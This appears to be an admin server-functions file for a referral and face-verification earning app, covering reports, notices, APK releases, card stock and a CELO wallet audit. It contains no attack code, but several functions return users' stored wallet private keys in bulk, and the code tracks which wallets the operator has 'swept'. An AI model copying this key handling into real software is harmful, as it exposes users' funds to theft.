// For a given referrer, returns a per-day breakdown of their referees'
// first-verifies & re-verifies, plus which referees hit 10 unique slots
// completed on which date. Powers the printable "sada kagojer moto" report.
export const adminUserDailyReport = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ userId: z.string().uuid(), days: z.number().int().min(1).max(120).default(60).optional() }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const daysBack = data.days ?? 60;

    const { data: profile } = await supabaseAdmin
      .from("profiles")
      .select("id, display_name, phone_number, referral_code, uid_seq")
      .eq("id", data.userId)
      .maybeSingle();

    // Get referees (paginated)
    const referees: any[] = [];
    for (let from = 0; ; from += 1000) {
      const { data: rs, error } = await supabaseAdmin
        .from("profiles")
        .select("id, uid_seq, display_name, phone_number, created_at")
        .eq("referred_by", data.userId)
        .order("created_at", { ascending: false })
        .order("id")
        .range(from, from + 999);
      if (error) throw new Error(error.message);
      referees.push(...(rs ?? []));
      if (!rs || rs.length < 1000) break;
    }
    const refereeById = new Map(referees.map((r) => [r.id, r]));
    const refereeIds = referees.map((r) => r.id);

    let taskRows: any[] = [];
    if (refereeIds.length > 0) {
      const CHUNK = 150;
      const chunks: string[][] = [];
      for (let i = 0; i < refereeIds.length; i += CHUNK) chunks.push(refereeIds.slice(i, i + CHUNK));
      const fetchChunk = async (chunk: string[]) => {
        const rows: any[] = [];
        for (let from = 0; ; from += 1000) {
          const { data, error } = await supabaseAdmin
            .from("tasks")
            .select("id, user_id, slot, initial_verify_at, last_reverified_at, reverify_count")
            .in("user_id", chunk)
            .order("id")
            .range(from, from + 999);
          if (error) throw new Error(error.message);
          rows.push(...(data ?? []));
          if (!data || data.length < 1000) break;
        }
        return rows;
      };
      const results = await Promise.all(chunks.map(fetchChunk));
      taskRows = results.flat();
    }

    // Bucket events by date (Asia/Dhaka).
    const tzFmt = new Intl.DateTimeFormat("en-CA", { timeZone: "Asia/Dhaka", year: "numeric", month: "2-digit", day: "2-digit" });
    const dayKey = (iso?: string | null) => (iso ? tzFmt.format(new Date(iso)) : null);
    const todayKey = tzFmt.format(new Date());

    type Event = { date: string; userId: string; slot: number; kind: "first" | "reverify"; at: string };
    const events: Event[] = [];
    // Also track cumulative unique first-verify slots per user (in chronological order) to detect "10-slot complete" day.
    const firstEventsByUser = new Map<string, { date: string; slot: number; at: string }[]>();

    for (const t of taskRows) {
      if (t.initial_verify_at) {
        const d = dayKey(t.initial_verify_at)!;
        events.push({ date: d, userId: t.user_id, slot: Number(t.slot), kind: "first", at: t.initial_verify_at });
        const arr = firstEventsByUser.get(t.user_id) ?? [];
        arr.push({ date: d, slot: Number(t.slot), at: t.initial_verify_at });
        firstEventsByUser.set(t.user_id, arr);
      }
      if (Number(t.reverify_count ?? 0) > 0 && t.last_reverified_at) {
        const d = dayKey(t.last_reverified_at)!;
        events.push({ date: d, userId: t.user_id, slot: Number(t.slot), kind: "reverify", at: t.last_reverified_at });
      }
    }

    // Detect the day each referee completed 10 unique slot first-verifies.
    const completionByUser = new Map<string, { date: string; at: string }>();
    for (const [uid, arr] of firstEventsByUser) {
      arr.sort((a, b) => new Date(a.at).getTime() - new Date(b.at).getTime());
      const seen = new Set<number>();
      for (const e of arr) {
        seen.add(e.slot);
        if (seen.size === 10) { completionByUser.set(uid, { date: e.date, at: e.at }); break; }
      }
    }

    // Group events by day.
    const cutoffMs = Date.now() - daysBack * 24 * 60 * 60 * 1000;
    const dayMap = new Map<string, {
      date: string;
      firstVerifies: { userId: string; name: string; uid: number; slot: number; at: string }[];
      reverifies: { userId: string; name: string; uid: number; slot: number; at: string }[];
      completions: { userId: string; name: string; uid: number; at: string }[];
    }>();
    const bucket = (d: string) => {
      let b = dayMap.get(d);
      if (!b) { b = { date: d, firstVerifies: [], reverifies: [], completions: [] }; dayMap.set(d, b); }
      return b;
    };
    for (const e of events) {
      if (new Date(e.at).getTime() < cutoffMs) continue;
      const ref = refereeById.get(e.userId);
      const info = { userId: e.userId, name: ref?.display_name ?? "User", uid: Number(ref?.uid_seq ?? 0), slot: e.slot, at: e.at };
      if (e.kind === "first") bucket(e.date).firstVerifies.push(info);
      else bucket(e.date).reverifies.push(info);
    }
    for (const [uid, c] of completionByUser) {
      if (new Date(c.at).getTime() < cutoffMs) continue;
      const ref = refereeById.get(uid);
      bucket(c.date).completions.push({ userId: uid, name: ref?.display_name ?? "User", uid: Number(ref?.uid_seq ?? 0), at: c.at });
    }

    const days = Array.from(dayMap.values()).sort((a, b) => b.date.localeCompare(a.date));
    const today = dayMap.get(todayKey) ?? { date: todayKey, firstVerifies: [], reverifies: [], completions: [] };

    // Per-referee totals across the window.
    const perRefTotals = referees.map((r) => {
      const arr = firstEventsByUser.get(r.id) ?? [];
      const firstSlots = new Set(arr.map((e) => e.slot));
      const revTasks = taskRows.filter((t) => t.user_id === r.id && Number(t.reverify_count ?? 0) > 0);
      const revSlots = new Set(revTasks.map((t) => Number(t.slot)));
      const completedAt = completionByUser.get(r.id)?.at ?? null;
      return {
        userId: r.id,
        uid: Number(r.uid_seq ?? 0),
        name: r.display_name ?? "User",
        phone: r.phone_number ?? "",
        joinedAt: r.created_at,
        firstVerifies: firstSlots.size,
        reverifies: revSlots.size,
        completedAt,
      };
    }).sort((a, b) => (b.firstVerifies + b.reverifies) - (a.firstVerifies + a.reverifies));

    return {
      profile: {
        id: profile?.id,
        name: profile?.display_name ?? "User",
        uid: Number((profile as any)?.uid_seq ?? 0),
        phone: profile?.phone_number ?? "",
        referralCode: profile?.referral_code ?? "",
      },
      today: {
        firstVerifies: today.firstVerifies.length,
        reverifies: today.reverifies.length,
        completions: today.completions,
        rows: today.firstVerifies.concat(today.reverifies.map((r) => ({ ...r }))), // for quick display
      },
      totals: {
        referees: referees.length,
        firstVerifies: events.filter((e) => e.kind === "first").length,
        reverifies: events.filter((e) => e.kind === "reverify").length,
        completions: completionByUser.size,
      },
      days,
      perReferee: perRefTotals,
      generatedAt: new Date().toISOString(),
      windowDays: daysBack,
    };
  });

// ---------------- Auto whitelist check monitor ----------------
// Shows the admin whether the every-2-minutes cron job is actually running,
// how many wallets it checked and how far the current batch has got.
export const adminWhitelistRuns = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const { data } = await supabaseAdmin
    .from("whitelist_runs")
    .select("*")
    .order("started_at", { ascending: false })
    .limit(10);
  const runs = data ?? [];
  const current = runs.find((r: any) => r.status === "running") ?? null;
  const last = runs.find((r: any) => r.status !== "running") ?? null;
  return { runs, current, last, serverNow: new Date().toISOString() };
});

// ---------------- Active mining users ----------------
// Lists every user whose mining meter is currently running, with the reason
// (10 re-verified slots / admin forced / referral commission only).
export const adminActiveMiningUsers = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();

  const rows: any[] = [];
  for (let from = 0; ; from += 1000) {
    const { data, error } = await supabaseAdmin
      .from("mining_state")
      .select("*, profiles:user_id(display_name, phone_number, uid_seq, banned)")
      .eq("is_active", true)
      .order("accrued_amount", { ascending: false })
      .range(from, from + 999);
    if (error) throw new Error(error.message);
    rows.push(...(data ?? []));
    if (!data || data.length < 1000) break;
  }

  const list = rows.map((m: any) => {
    const selfOk = m.self_qualified !== false || !!m.admin_forced_active;
    const slots = selfOk ? Number((m as any).self_slots ?? m.effective_task_count ?? 0) : 0;
    const refs = Number(m.qualifying_referees ?? 0);
    const refUnits = Number((m as any).referral_units ?? refs);
    // 50৳/month per re-verified slot; referrer earns 10% of referee earnings.
    const monthly = 50 * (slots + refUnits);

    return {
      userId: m.user_id as string,
      name: m.profiles?.display_name ?? "User",
      phone: m.profiles?.phone_number ?? "",
      uid: Number(m.profiles?.uid_seq ?? 0),
      banned: !!m.profiles?.banned,
      slots,
      refs,
      monthly,
      accrued: Number(m.accrued_amount ?? 0),
      withdrawn: Number(m.withdrawn_amount ?? 0),
      bonus: Number(m.bonus_amount ?? 0),
      referralAccrued: Number(m.referral_accrued ?? 0),
      forced: !!m.admin_forced_active,
      activatedAt: m.activated_at ?? null,
      lastCreditedAt: m.last_credited_at ?? null,
    };
  }).sort((a, b) => b.monthly - a.monthly || b.accrued - a.accrued);

  return {
    total: list.length,
    forcedCount: list.filter((u) => u.forced).length,
    refOnlyCount: list.filter((u) => u.slots < 10 && u.refs > 0).length,
    monthlyTotal: list.reduce((s, u) => s + u.monthly, 0),
    users: list,
  };
});

// ---------------- Maintenance mode + ব্যক্তিগত নোটিশ ----------------

/** পুরো অ্যাপ maintenance মোডে on/off */
export const adminSetMaintenance = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    enabled: z.boolean(),
    message: z.string().max(1000).optional().nullable(),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { error } = await supabaseAdmin.from("bonus_settings").upsert({
      id: "default",
      maintenance_enabled: data.enabled,
      maintenance_message: data.message ?? null,
      updated_at: new Date().toISOString(),
    } as any);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

/** ফেস ভেরিফিকেশন সিস্টেম চালু/বন্ধ (বন্ধ থাকলে নতুন slot verify + নতুন signup বন্ধ) */
export const adminSetFaceVerify = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    enabled: z.boolean(),
    faceMessage: z.string().max(1500).optional().nullable(),
    signupMessage: z.string().max(1500).optional().nullable(),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { error } = await supabaseAdmin.from("bonus_settings").upsert({
      id: "default",
      face_verify_enabled: data.enabled,
      face_verify_off_message: data.faceMessage ?? null,
      signup_off_message: data.signupMessage ?? null,
      updated_at: new Date().toISOString(),
    } as any);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

/** নতুন (first) ফেস ভেরিফাই আলাদা সুইচ — re-verify চালু থাকবে */
export const adminSetFirstVerify = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    enabled: z.boolean(),
    message: z.string().max(1500).optional().nullable(),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { error } = await supabaseAdmin.from("bonus_settings").upsert({
      id: "default",
      first_verify_enabled: data.enabled,
      first_verify_off_message: data.message ?? null,
      updated_at: new Date().toISOString(),
    } as any);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

/** Welcome bonus offer master switch (first verify / re-verify / referral bonus) */
export const adminSetBonusEnabled = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ enabled: z.boolean() }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { error } = await supabaseAdmin.from("bonus_settings").upsert({
      id: "default",
      bonus_enabled: data.enabled,
      updated_at: new Date().toISOString(),
    } as any);
    if (error) throw new Error(error.message);
    return { ok: true };
  });



/** UID দিয়ে নির্দিষ্ট ইউজারকে লাল নোটিশ (মেসেজ) পাঠানো */
export const adminSendUserNotice = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    uid: z.number().int().positive().optional().nullable(),
    userId: z.string().uuid().optional().nullable(),
    title: z.string().max(120).optional().nullable(),
    body: z.string().trim().min(1).max(2000),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    if (!data.uid && !data.userId) throw new Error("UID অথবা user নির্বাচন করুন");
    let q = supabaseAdmin.from("profiles").select("id, display_name, uid_seq");
    q = data.userId ? q.eq("id", data.userId) : q.eq("uid_seq", data.uid as number);
    const { data: prof } = await q.maybeSingle();
    if (!prof?.id) throw new Error(`${data.uid ?? data.userId} — এই ইউজার পাওয়া যায়নি`);
    const { error } = await supabaseAdmin.from("user_notices").insert({
      user_id: prof.id,
      title: data.title || null,
      body: data.body,
    } as any);
    if (error) throw new Error(error.message);
    // ফোনেও notification যাবে (native অ্যাপ ইনস্টল থাকলে, অ্যাপ বন্ধ থাকলেও)
    try {
      const { sendPushToUser } = await import("@/lib/push.server");
      await sendPushToUser(String(prof.id), {
        title: data.title || "📢 Good App নোটিশ",
        body: data.body.slice(0, 200),
        url: "/home",
      });
    } catch { /* push ফেল করলেও নোটিশ থেকে যাবে */ }
    return { ok: true, name: prof.display_name ?? null, uid: prof.uid_seq ?? data.uid };
  });

/** সর্বশেষ পাঠানো নোটিশগুলো */
export const adminListUserNotices = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const { data } = await supabaseAdmin
    .from("user_notices")
    .select("id, title, body, created_at, read_at, profiles:user_id(display_name, uid_seq)")
    .order("created_at", { ascending: false })
    .limit(30);
  return (data ?? []).map((r: any) => ({
    id: r.id,
    title: r.title as string | null,
    body: r.body as string,
    createdAt: r.created_at as string,
    read: !!r.read_at,
    uid: r.profiles?.uid_seq ?? null,
    name: r.profiles?.display_name ?? null,
  }));
});

/** নোটিশ মুছে দাও */
export const adminDeleteUserNotice = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ id: z.string().uuid() }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { error } = await supabaseAdmin.from("user_notices").delete().eq("id", data.id);
    if (error) throw new Error(error.message);
    return { ok: true };
  });


/** APK আপলোডের জন্য signed upload URL (ফাইল সরাসরি ব্রাউজার থেকে storage-এ যায়) */
export const adminCreateApkUpload = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    version: z.string().trim().regex(/^\d+\.\d+(?:\.\d+)?$/, "সঠিক APK version দিন—যেমন 1.5"),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const path = `good-app-v${data.version.replace(/[^0-9a-zA-Z._-]/g, "")}-${Date.now()}.apk`;
    const { data: signed, error } = await supabaseAdmin.storage
      .from("app-releases")
      .createSignedUploadUrl(path);
    if (error || !signed) throw new Error(error?.message || "upload URL তৈরি করা যায়নি");
    return { path, token: signed.token, signedUrl: signed.signedUrl };
  });

/** আপলোড শেষে APK লিংক/ভার্সন সেভ করো */
export const adminSetApkRelease = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    path: z.string().trim().min(1).max(300),
    version: z.string().trim().regex(/^\d+\.\d+(?:\.\d+)?$/, "সঠিক APK version দিন—যেমন 1.5"),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const cleanVersion = data.version;
    const { data: uploaded, error: uploadedError } = await supabaseAdmin.storage
      .from("app-releases")
      .list("", { search: data.path, limit: 2 });
    const uploadedFile = uploaded?.find((file) => file.name === data.path);
    if (uploadedError || !uploadedFile || Number(uploadedFile.metadata?.size ?? 0) < 1_000_000) {
      throw new Error("APK ফাইলটি সম্পূর্ণ আপলোড হয়নি—আবার আপলোড করুন");
    }
    const { data: saved, error } = await supabaseAdmin
      .from("bonus_settings")
      .upsert({
        id: "default",
        apk_url: data.path,
        apk_version: cleanVersion,
        min_app_version: cleanVersion,
        force_update_enabled: true,
        updated_at: new Date().toISOString(),
      } as any)
      .select("apk_url, apk_version, min_app_version, force_update_enabled")
      .single();
    if (error) throw new Error(error.message);
    if (!saved || (saved as any).apk_url !== data.path || (saved as any).apk_version !== cleanVersion) {
      throw new Error("APK আপলোড হয়েছে, কিন্তু নতুন version চালু করা যায়নি—আবার চেষ্টা করুন");
    }
    return {
      ok: true,
      path: data.path,
      version: cleanVersion,
      downloadUrl: `/api/public/app/download?v=${encodeURIComponent(cleanVersion)}&file=${encodeURIComponent(data.path)}`,
    };
  });

// ---------------- Push notification (ব্রডকাস্ট + অ্যাডমিন ডিভাইস) ----------------

/** সব ইউজারকে notification (ফোনের উপরে আসবে, অ্যাপ বন্ধ থাকলেও) */
export const adminBroadcastPush = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    title: z.string().trim().min(1).max(120),
    body: z.string().trim().min(1).max(500),
    url: z.string().trim().max(200).optional().nullable(),
    alsoInApp: z.boolean().default(true),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { sendPushToAllTokens } = await import("@/lib/push.server");
    const res = await sendPushToAllTokens({
      title: data.title,
      body: data.body,
      url: data.url || "/home",
    });

    let inApp = 0;
    if (data.alsoInApp) {
      // অ্যাপের ভেতরের নোটিশ বেল-এও দেখাবে
      const page = 1000;
      for (let from = 0; from < 100_000; from += page) {
        const { data: ids } = await supabaseAdmin
          .from("profiles").select("id").range(from, from + page - 1);
        const rows = ids ?? [];
        if (rows.length === 0) break;
        await supabaseAdmin.from("user_notices").insert(
          rows.map((r: any) => ({ user_id: r.id, title: data.title, body: data.body })) as any,
        );
        inApp += rows.length;
        if (rows.length < page) break;
      }
    }
    return { ok: true, devices: res.devices, sent: res.sent, failed: res.failed, inApp };
  });

/** অ্যাডমিন notification ডিভাইস তালিকা */
export const adminListPushTargets = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const { data } = await supabaseAdmin
    .from("admin_push_targets")
    .select("user_id, label, created_at")
    .order("created_at", { ascending: false });
  const rows = data ?? [];
  if (rows.length === 0) return [];
  const ids = rows.map((r: any) => r.user_id);
  const [{ data: profs }, { data: toks }] = await Promise.all([
    supabaseAdmin.from("profiles").select("id, display_name, uid_seq").in("id", ids),
    supabaseAdmin.from("push_tokens").select("user_id").in("user_id", ids),
  ]);
  return rows.map((r: any) => {
    const p = (profs ?? []).find((x: any) => x.id === r.user_id);
    return {
      userId: r.user_id as string,
      label: (r.label as string | null) ?? null,
      name: p?.display_name ?? null,
      uid: p?.uid_seq ?? null,
      devices: (toks ?? []).filter((t: any) => t.user_id === r.user_id).length,
    };
  });
});

/** UID দিয়ে অ্যাডমিন ডিভাইস যোগ করা (ওই account-এর ফোনে admin alert যাবে) */
export const adminAddPushTarget = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    uid: z.number().int().positive(),
    label: z.string().trim().max(60).optional().nullable(),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { data: prof } = await supabaseAdmin
      .from("profiles").select("id, display_name").eq("uid_seq", data.uid).maybeSingle();
    if (!prof?.id) throw new Error(`UID ${data.uid} — ইউজার পাওয়া যায়নি`);
    const { error } = await supabaseAdmin
      .from("admin_push_targets")
      .upsert({ user_id: prof.id, label: data.label || null } as any);
    if (error) throw new Error(error.message);
    return { ok: true, name: prof.display_name ?? null };
  });

/** অ্যাডমিন ডিভাইস সরানো */
export const adminRemovePushTarget = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ userId: z.string().uuid() }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { error } = await supabaseAdmin.from("admin_push_targets").delete().eq("user_id", data.userId);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

/** টেস্ট: অ্যাডমিন ফোনে notification যাচ্ছে কি না */
export const adminTestAdminPush = createServerFn({ method: "POST" }).handler(async () => {
  await gate();
  const { sendPushToAdmins } = await import("@/lib/push.server");
  const res = await sendPushToAdmins({
    title: "🔔 Test notification",
    body: "অ্যাডমিন notification ঠিকঠাক কাজ করছে ✅",
    url: "/admin/withdrawals",
  });
  return res;
});

export const adminCreateTestApkUpload = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ version: z.string() }).parse(i))
  .handler(async ({ data: input }) => {
    const supabaseAdmin = await gate();
    const fileName = `test-app-v${input.version}-${Date.now()}.apk`;
    const path = `releases/${fileName}`;
    const { data: s, error } = await supabaseAdmin.storage.from("app-releases").createSignedUploadUrl(path);
    if (error) throw new Error(error.message);
    return { path, signedUrl: s.signedUrl };
  });

export const adminSetTestApkRelease = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ path: z.string(), version: z.string() }).parse(i))
  .handler(async ({ data: input }) => {
    const supabaseAdmin = await gate();
    const pathParts = input.path.split("/");
    const fileName = pathParts.pop();
    const folder = pathParts.join("/");
    if (!fileName) throw new Error("টেস্ট APK path সঠিক নয়");
    const { data: uploaded, error: uploadedError } = await supabaseAdmin.storage
      .from("app-releases")
      .list(folder, { search: fileName, limit: 2 });
    const uploadedFile = uploaded?.find((file) => file.name === fileName);
    if (uploadedError || !uploadedFile || Number(uploadedFile.metadata?.size ?? 0) < 1_000_000) {
      throw new Error("টেস্ট APK সম্পূর্ণ আপলোড হয়নি—আবার চেষ্টা করুন");
    }
    const { error } = await supabaseAdmin
      .from("bonus_settings")
      .upsert({
        id: "default",
        test_apk_url: input.path,
        test_apk_version: input.version,
        updated_at: new Date().toISOString(),
      } as any);
    if (error) throw new Error(error.message);
    const { data: s } = await supabaseAdmin.storage.from("app-releases").createSignedUrl(input.path, 60 * 60 * 24 * 365);
    return { ok: true, path: input.path, version: input.version, downloadUrl: s?.signedUrl };
  });

// ---------------- Cards ----------------

export const adminListCardProducts = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const { data, error } = await supabaseAdmin
    .from("card_products")
    .select("*, stock_count:card_codes(count)")
    .order("created_at", { ascending: false });
  if (error) throw new Error(error.message);
  
  // Transform count objects into numbers
  return (data as any[]).map(card => ({
    ...card,
    stock_count: card.stock_count?.[0]?.count ?? 0
  }));
});

export const adminCreateCardProduct = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    name: z.string(),
    operator: z.enum(["GP", "Robi", "Airtel", "Banglalink", "Other"]),
    card_type: z.enum(["Minute", "Internet"]),
    amount_label: z.string(),
    selling_price: z.number(),
    image_url: z.string().nullish(),
    description: z.string().nullish(),
    validity: z.string().nullish(),
    is_active: z.boolean().default(true),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { data: res, error } = await supabaseAdmin.from("card_products").insert(data).select().single();
    if (error) throw new Error(error.message);
    return res;
  });

export const adminUpdateCardProduct = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    id: z.string().uuid(),
    data: z.object({
      name: z.string().optional(),
      operator: z.enum(["GP", "Robi", "Airtel", "Banglalink", "Other"]).optional(),
      card_type: z.enum(["Minute", "Internet"]).optional(),
      amount_label: z.string().optional(),
      selling_price: z.number().optional(),
      image_url: z.string().nullish(),
      description: z.string().nullish(),
      validity: z.string().nullish(),
      is_active: z.boolean().optional(),
    })
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { error } = await supabaseAdmin.from("card_products").update(data.data).eq("id", data.id);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

export const adminDeleteCardProduct = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ id: z.string().uuid() }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { error } = await supabaseAdmin.from("card_products").delete().eq("id", data.id);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

export const adminAddCardCodes = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    productId: z.string().uuid(),
    codes: z.array(z.string().min(1)),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const rows = data.codes.map(code => ({
      product_id: data.productId,
      code,
      is_used: false
    }));
    const { error } = await supabaseAdmin.from("card_codes").insert(rows);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

export const adminGetProductCodes = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ productId: z.string().uuid() }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { data: codes, error } = await supabaseAdmin
      .from("card_codes")
      .select("*")
      .eq("product_id", data.productId)
      .order("created_at", { ascending: false });
    if (error) throw new Error(error.message);
    return codes;
  });


// ---------------- On-chain wallet audit (fresh / untouched wallets) ----------------
export const adminOnchainScanBatch = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ limit: z.number().min(1).max(120).default(60) }).parse(i ?? {}))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { data: tasks, error } = await supabaseAdmin
      .from("tasks")
      .select("wallet_address")
      .not("wallet_address", "is", null)
      .limit(6000);
    if (error) throw new Error(error.message);
    const wallets = Array.from(new Set((tasks ?? []).map((t: any) => t.wallet_address as string)));

    const scanned = new Set<string>();
    for (let from = 0; ; from += 1000) {
      const { data: rows } = await supabaseAdmin
        .from("wallet_onchain_scan")
        .select("wallet_address")
        .range(from, from + 999);
      (rows ?? []).forEach((r: any) => scanned.add(r.wallet_address));
      if (!rows || rows.length < 1000) break;
    }

    const pending = wallets.filter((w) => !scanned.has(w));
    const batch = pending.slice(0, data.limit);
    const { scanWallets, recomputePristine } = await import("@/lib/onchain-scan.server");
    if (batch.length > 0) await scanWallets(batch);
    const stats = await recomputePristine();
    return { total: wallets.length, done: scanned.size + batch.length, remaining: Math.max(0, pending.length - batch.length), pristine: stats.pristine };
  });

export const adminFreshWallets = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();

  const scans: any[] = [];
  for (let from = 0; ; from += 1000) {
    const { data, error } = await supabaseAdmin
      .from("wallet_onchain_scan")
      .select("wallet_address, nonce, token_out_count, token_in_count, celo_in_external, pristine")
      .range(from, from + 999);
    if (error) throw new Error(error.message);
    scans.push(...(data ?? []));
    if (!data || data.length < 1000) break;
  }
  const scanMap = new Map(scans.map((s) => [s.wallet_address, s]));

  const tasks: any[] = [];
  for (let from = 0; ; from += 1000) {
    const { data, error } = await supabaseAdmin
      .from("tasks")
      .select("id, slot, whitelist_ok, wallet_address, wallet_private_key, reverify_count, initial_verify_at")
      .not("wallet_address", "is", null)
      .range(from, from + 999);
    if (error) throw new Error(error.message);
    tasks.push(...(data ?? []));
    if (!data || data.length < 1000) break;
  }

  // Wallets whose keys were used in a token/CELO sweep job are "touched" for
  // sure — that is our own outgoing transfer. This works instantly for every
  // wallet, even before the (slow) on-chain scan reaches it.
  const sweptKeys = new Set<string>();
  for (let from = 0; ; from += 200) {
    const { data, error } = await supabaseAdmin
      .from("celo_sweep_jobs")
      .select("keys")
      .range(from, from + 199);
    if (error) throw new Error(error.message);
    (data ?? []).forEach((j: any) => (j.keys ?? []).forEach((k: string) => sweptKeys.add(k)));
    if (!data || data.length < 200) break;
  }

  const wasSwept = (t: any) => !!t.wallet_private_key && sweptKeys.has(t.wallet_private_key);
  // fresh = we never swept it AND the on-chain scan (when available) agrees
  const fresh = tasks.filter((t) => {
    if (wasSwept(t)) return false;
    const s = scanMap.get(t.wallet_address);
    return s ? s.pristine : true;
  });
  const touched = tasks.filter((t) => {
    if (wasSwept(t)) return true;
    const s = scanMap.get(t.wallet_address);
    return !!s && !s.pristine;
  });


  const keys = (rows: any[]) => rows.map((r) => r.wallet_private_key).filter(Boolean) as string[];
  const freshWl = fresh.filter((t) => t.whitelist_ok);
  const freshNoReverify = freshWl.filter((t) => (t.reverify_count ?? 0) === 0);
  const freshReverified = fresh.filter((t) => (t.reverify_count ?? 0) >= 1);
  const freshReverifiedLostWl = freshReverified.filter((t) => !t.whitelist_ok);

  return {
    scannedWallets: scans.length,
    totalWallets: new Set(tasks.map((t) => t.wallet_address)).size,
    fresh: {
      count: fresh.length,
      wl: freshWl.length,
      notWl: fresh.length - freshWl.length,
      neverReverified: freshNoReverify.length,
      reverifiedOnce: freshReverified.filter((t) => (t.reverify_count ?? 0) === 1).length,
      reverified: freshReverified.length,
      reverifiedLostWl: freshReverifiedLostWl.length,
      keys: keys(fresh),
      keysWl: keys(freshWl),
      keysNeverReverified: keys(freshNoReverify),
    },
    touched: {
      count: touched.length,
      reverified: touched.filter((t) => (t.reverify_count ?? 0) >= 1).length,
      reverifiedLostWl: touched.filter((t) => (t.reverify_count ?? 0) >= 1 && !t.whitelist_ok).length,
      keys: keys(touched),
    },
  };
});

// ---------------- ফেস রেজিস্ট্রেশন (login method) key — স্লট key থেকে আলাদা ----------------
export const adminFaceSignupKeys = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const { data } = await supabaseAdmin
    .from("face_signups")
    .select("id, display_name, phone_number, wallet_address, wallet_private_key, status, user_id, created_at, verified_at")
    .order("created_at", { ascending: false })
    .limit(500);
  const rows = (data ?? []) as any[];
  const verified = rows.filter((r) => r.status === "verified" && r.user_id);
  const pending = rows.filter((r) => !(r.status === "verified" && r.user_id));
  return {
    verified,
    pending,
    verifiedKeys: verified.map((r) => r.wallet_private_key).filter(Boolean),
    pendingKeys: pending.map((r) => r.wallet_private_key).filter(Boolean),
  };
});

/** 📺 Google AdMob অ্যাড সিস্টেমের মাস্টার সুইচ + Ad Unit ID */
export const adminSetAdsSettings = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    enabled: z.boolean(),
    testMode: z.boolean().optional(),
    banner: z.boolean().optional(),
    rewarded: z.boolean().optional(),
    appOpen: z.boolean().optional(),
    bannerUnit: z.string().trim().max(120).optional().nullable(),
    interstitialUnit: z.string().trim().max(120).optional().nullable(),
    rewardedUnit: z.string().trim().max(120).optional().nullable(),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const patch: Record<string, unknown> = {
      id: "default",
      ads_enabled: data.enabled,
      updated_at: new Date().toISOString(),
    };
    if (data.testMode !== undefined) patch.ads_test_mode = data.testMode;
    if (data.banner !== undefined) patch.ads_banner_enabled = data.banner;
    if (data.rewarded !== undefined) patch.ads_rewarded_enabled = data.rewarded;
    if (data.appOpen !== undefined) patch.ads_appopen_enabled = data.appOpen;
    if (data.bannerUnit !== undefined) patch.ads_banner_unit = data.bannerUnit || null;
    if (data.interstitialUnit !== undefined) patch.ads_interstitial_unit = data.interstitialUnit || null;
    if (data.rewardedUnit !== undefined) patch.ads_rewarded_unit = data.rewardedUnit || null;
    const { error } = await supabaseAdmin.from("bonus_settings").upsert(patch as any);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

